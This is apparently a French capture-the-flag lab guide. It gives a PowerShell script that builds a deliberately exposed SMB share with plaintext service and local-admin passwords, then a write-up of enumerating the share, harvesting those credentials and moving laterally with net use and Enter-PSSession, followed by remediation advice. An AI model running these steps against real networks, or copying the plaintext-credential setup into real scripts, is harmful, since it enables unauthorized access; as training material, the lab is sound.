# Flag 5 — Partage SMB avec fichiers sensibles

> **Technique :** SMB Enumeration + Credential Discovery
> **Machine de déploiement :** DC01
> **Machine d'exploitation :** WS01 ou WS02
> **Compte de départ :** `CTF\lowpriv` / `User@1234`
> **Difficulté :** Facile

---

## Déploiement

### Script — Flag5-SMB-Share.ps1

> [!warning] Lancer en PowerShell Admin sur DC01

```powershell
#Requires -RunAsAdministrator

Write-Host "`n[FLAG 5] Partage SMB avec fichiers sensibles" -ForegroundColor Cyan

$sharePath = "C:\Shares\Sensitive"
New-Item -ItemType Directory -Path $sharePath -Force | Out-Null

# Supprimer le share s'il existe deja
if (Get-SmbShare -Name "Sensitive" -ErrorAction SilentlyContinue) {
    Remove-SmbShare -Name "Sensitive" -Force
    Write-Host "  [~] Ancien share Sensitive supprime" -ForegroundColor Gray
}

# Creer le share accessible a tous les utilisateurs authentifies
New-SmbShare -Name "Sensitive" -Path $sharePath | Out-Null

# ACL NTFS : lecture pour utilisateurs authentifies (S-1-5-11)
# Compatible Windows FR et EN via SID universel
$aclShare = Get-Acl $sharePath
$authSID  = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
$ruleAuth = New-Object System.Security.AccessControl.FileSystemAccessRule(
    $authSID, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")
$aclShare.AddAccessRule($ruleAuth)
Set-Acl -Path $sharePath -AclObject $aclShare
Write-Host "  [+] Share \\DC01\Sensitive cree (lecture pour utilisateurs authentifies)" -ForegroundColor Green

# flag5.txt
Set-Content "$sharePath\flag5.txt" -Value "FLAG{smb_sensitive_data_exposed}" -Encoding UTF8

# Script de backup avec credentials en clair
@"
# Script de sauvegarde automatique - ne pas supprimer
# Planifie chaque nuit a 02h00
net use Z: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99
robocopy C:\Data Z:\Backup /MIR /LOG:C:\Logs\backup.log
net use Z: /delete
"@ | Set-Content "$sharePath\backup.ps1" -Encoding UTF8

# Fichier passwords.txt orientant vers backup.zip
@"
# Rotation des mots de passe - CONFIDENTIEL
# Derniere mise a jour : 2024-01-15
#
# Comptes de service :
#   svc-backup -> voir backup.zip (readme.txt)
#   svc-web    -> voir backup.zip (readme.txt)
#
# Compte admin local WS01/WS02 :
#   Voir backup.zip -> readme.txt
"@ | Set-Content "$sharePath\passwords.txt" -Encoding UTF8

# backup.zip contenant les credentials admin-local
$staging = "C:\Temp\BackupStaging"
New-Item -ItemType Directory -Path $staging -Force | Out-Null
@"
=== Backup de configuration - 2024-01-15 ===

Comptes locaux actifs sur WS01 et WS02 :
  admin-local : AdminLocal@WS01

Compte de service backup :
  CTF\svc-backup : Backup@Secure99

Ne pas diffuser.
"@ | Set-Content "$staging\readme.txt" -Encoding UTF8

Compress-Archive -Path "$staging\*" -DestinationPath "$sharePath\backup.zip" -Force
Remove-Item $staging -Recurse -Force
Write-Host "  [+] Fichiers crees : flag5.txt, backup.ps1, passwords.txt, backup.zip" -ForegroundColor Green

# Verifications
Write-Host "`n  [*] Contenu du share :" -ForegroundColor Yellow
Get-ChildItem $sharePath | Select-Object Name
Write-Host "`n  [*] Flag :" -ForegroundColor Yellow
Get-Content "$sharePath\flag5.txt"

Write-Host "`n[FLAG 5] DONE" -ForegroundColor Green
Write-Host "  SNAPSHOT : DC01 - Flag5 deploye" -ForegroundColor Yellow
```

---

### Vérification du déploiement

> [!warning] Depuis PowerShell Admin sur DC01

```powershell
# Verifier le share
Get-SmbShare -Name "Sensitive"

# Verifier les fichiers
Get-ChildItem "C:\Shares\Sensitive"
# Attendu : flag5.txt, backup.ps1, passwords.txt, backup.zip

# Verifier le flag
Get-Content "C:\Shares\Sensitive\flag5.txt"
# Attendu : FLAG{smb_sensitive_data_exposed}

# Verifier le contenu de backup.zip
Expand-Archive "C:\Shares\Sensitive\backup.zip" -DestinationPath "C:\Temp\test" -Force
Get-Content "C:\Temp\test\readme.txt"
Remove-Item "C:\Temp\test" -Recurse -Force
```

> [!success] Snapshot DC01
> **`DC01 — Flag5 déployé`**

---

## Write-up

### Contexte

Un partage SMB `Sensitive` est accessible en lecture à tous les utilisateurs authentifiés du domaine. Il contient plusieurs fichiers dont un script de sauvegarde avec des credentials en clair et une archive de backup contenant un fichier de documentation avec des mots de passe d'administration.

---

### Reconnaissance

#### Étape 1 — Énumérer les shares disponibles

Connecté en `CTF\lowpriv` sur WS01, ouvrir PowerShell :

```powershell
# Lister les shares sur DC01
net view \\DC01
```

**Résultat :**

```
Ressources partagées sur \\DC01

Nom du partage  Type  Commentaire
-----------------------------------------------------------------
Backups         Disque
NETLOGON        Disque
Sensitive       Disque
SYSVOL          Disque
```

Le share `Sensitive` est visible. On y accède :

```powershell
net use S: \\DC01\Sensitive
dir S:\
```

**Résultat :**

```
Répertoire : S:\

Mode    Name
----    ----
-a----  backup.ps1
-a----  backup.zip
-a----  flag5.txt
-a----  passwords.txt
```

---

### Exploitation

#### Étape 2 — Lire le flag direct

```powershell
Get-Content S:\flag5.txt
```

**Résultat :**

```
FLAG{smb_sensitive_data_exposed}
```

#### Étape 3 — Aller plus loin — lire backup.ps1

```powershell
Get-Content S:\backup.ps1
```

**Résultat :**

```powershell
# Script de sauvegarde automatique - ne pas supprimer
# Planifie chaque nuit a 02h00
net use Z: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99
robocopy C:\Data Z:\Backup /MIR /LOG:C:\Logs\backup.log
net use Z: /delete
```

Les credentials de `svc-backup` sont exposés : `Backup@Secure99`.

#### Étape 4 — Extraire l'archive backup.zip

```powershell
Expand-Archive S:\backup.zip -DestinationPath C:\Temp\backup -Force
Get-Content C:\Temp\backup\readme.txt
```

**Résultat :**

```
=== Backup de configuration - 2024-01-15 ===

Comptes locaux actifs sur WS01 et WS02 :
  admin-local : AdminLocal@WS01

Compte de service backup :
  CTF\svc-backup : Backup@Secure99

Ne pas diffuser.
```

On obtient les credentials du compte admin local : `admin-local` / `AdminLocal@WS01`.

#### Étape 5 — Utiliser les credentials admin-local sur WS01

```powershell
# Se connecter en admin local sur WS01
$cred = New-Object System.Management.Automation.PSCredential(
    "WS01\admin-local",
    (ConvertTo-SecureString "AdminLocal@WS01" -AsPlainText -Force)
)
Enter-PSSession -ComputerName WS01 -Credential $cred
```

---

### Récupération du flag

```powershell
Get-Content S:\flag5.txt
```

**Résultat :**

```
FLAG{smb_sensitive_data_exposed}
```

---

### Aller plus loin

```powershell
# Utiliser les credentials svc-backup pour acceder au share Backups
net use B: \\DC01\Backups /user:CTF\svc-backup Backup@Secure99
Get-Content B:\flag3.txt

# Utiliser admin-local pour acceder a WS01 en tant qu'admin
Enter-PSSession -ComputerName WS01 -Credential (Get-Credential)
# WS01\admin-local / AdminLocal@WS01
```

---

### Remédiation

| Problème | Correction |
|---|---|
| Share accessible à tous les utilisateurs authentifiés | Restreindre l'accès aux seuls comptes qui en ont besoin |
| Credentials en clair dans backup.ps1 | Utiliser des secrets managés (LAPS, Azure Key Vault, PSCredential chiffrée) |
| Archive de backup avec mots de passe | Ne jamais stocker de credentials dans des fichiers texte ou archives partagées |
| Pas d'audit des accès SMB | Activer l'audit des accès aux fichiers sur les shares sensibles |

---

### Résumé de la chaîne d'exploitation

```
lowpriv
  └─→ net view \\DC01 → share Sensitive visible
        └─→ dir S:\ → flag5.txt, backup.ps1, backup.zip
              ├─→ flag5.txt → FLAG{smb_sensitive_data_exposed}
              │
              ├─→ backup.ps1 → svc-backup / Backup@Secure99
              │     └─→ net use \\DC01\Backups → flag3.txt
              │
              └─→ backup.zip → readme.txt → admin-local / AdminLocal@WS01
                    └─→ Enter-PSSession WS01 en admin local
```
